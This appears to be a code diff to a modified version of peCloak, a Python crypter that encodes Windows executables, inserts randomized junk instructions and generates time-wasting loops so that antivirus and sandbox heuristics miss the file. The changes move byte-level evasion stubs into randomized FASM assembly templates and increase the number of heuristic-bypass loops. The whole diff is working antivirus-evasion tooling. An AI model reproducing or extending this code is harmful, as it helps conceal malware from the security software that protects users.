@@ -451,7 +451,6 @@ def get_one_trash_instruction():
 	trash_string = open("trash", "r").read()
 	trash_list = trash_string.split("{{end}}")
 	rnd = Template(random.choice(trash_list)).generate(rand_reg=random.choice(reg),rand_int=randint(0,999999))
-	print rnd
 	return rnd
 
 def add_fill_instructions(limit):
@@ -523,14 +522,14 @@ def build_decoder(pe, encoder, section, decode_start, decode_end):
 		modifier = int(i.split(" ")[1])		 # get operation modifier
 		decode_instruction = ''+(decode_instructions[encode_instruction] + str(modifier)) # get corresponding decoder instruction
 		decoder.append(decode_instruction) # prepend the decode instruction to execute in reverse order
-		decoder.append(add_fill_instructions(5))
+		decoder.append(add_fill_instructions(3))
 	decoder.reverse()
 	asm = Template(open("unpack.tpl.asm", "r").read()).generate(
         decode_start=decode_start,
         decode_end=decode_end,
         Decoder='\n'.join(decoder),
 		peCloak=peCloak,
-		trash_max_count=10
+		trash_max_count=5
     )
 	with open("unpack.asm", "w") as f:
 		f.write(asm)
@@ -819,19 +818,17 @@ def build_new_entry_jump(pe, new_entry_address):
 	Generate the heuristic bypass time-sink code
 '''	
 def generate_heuristic(loop_limit):
-	
-	fill_limit = randint(1,8) # the maximum number of fill instructions to generate in between the heuristic instructions
-	heuristic = ""
-	heuristic += "\x33\xC0"  														# XOR EAX,EAX
-	#todo: heuristic += add_fill_instructions(fill_limit)									# fill
-	heuristic += "\x40"   															# INC EAX
-	#todo: heuristic += add_fill_instructions(fill_limit)									# fill
-	heuristic += "\x3D" + struct.pack("L", loop_limit)  							# CMP EAX,loop_limit
-	short_jump = binascii.unhexlify(format((1 << 16) - (len(heuristic)), 'x')[2:])  # Jump immediately after XOR EAX,EAX
-	heuristic += "\x75" + short_jump   											    # JNZ SHORT 
-	#todo: heuristic += add_fill_instructions(fill_limit)									# fill
-	heuristic += "\x90\x90\x90"   													# NOP
-	return heuristic
+	reg = ["eax", "ecx", "edx", "edx"]
+	asm = Template(open("heuristic.tpl.asm", "r").read()).generate(
+			loop_limit = loop_limit,
+			peCloak=peCloak,
+			trash_max_count=3,
+			rand_reg=random.choice(reg)
+		)
+	with open("heuristic.asm", "w") as f:
+		f.write(asm)
+	os.system(os.getcwd()+r"\fasm\FASM.EXE heuristic.asm")
+	return open("heuristic.bin", "rb").read()
 
 '''
 	This is a very basic attempt to circumvent remedial client-side sandbox heuristic scanning
@@ -839,7 +836,17 @@ def generate_heuristic(loop_limit):
 '''
 def build_heuristic_bypass(heuristic_iterations):
 	# we only need to clear these registers once
-	heuristic_start = "\x90\x90\x90\x90\x90\x90" # XOR ESI,ESI
+	reg = ["eax", "ecx", "edx", "edx"]
+	asm = Template(open("EP.tpl.asm", "r").read()).generate(
+			peCloak=peCloak,
+			trash_max_count=3,
+			rand_reg=random.choice(reg)
+		)
+	with open("EP.asm", "w") as f:
+		f.write(asm)
+	os.system(os.getcwd()+r"\fasm\FASM.EXE EP.asm")
+	heuristic_start = open("EP.bin", "rb").read()
+	heuristic_start += "\x90\x90\x90\x90\x90\x90" # XOR ESI,ESI
 	heuristic_start += "\x31\xf6"   			 # XOR ESI,ESI
 	heuristic_start += "\x31\xff"   			 # XOR EDI,EDI
 	#TODO: heuristic_start += add_fill_instructions(5)
@@ -1013,7 +1020,7 @@ def main(argv):
 	header +=	'|                         Mod: bilka00									 |\n'
 	header +=	'=========================================================================\n\n'
 
-	heuristic_iterations = 3 # TODO
+	heuristic_iterations = 10 # TODO
 	section_to_encode = "default"
 	section_to_mod = ""
 	mod_range = ""
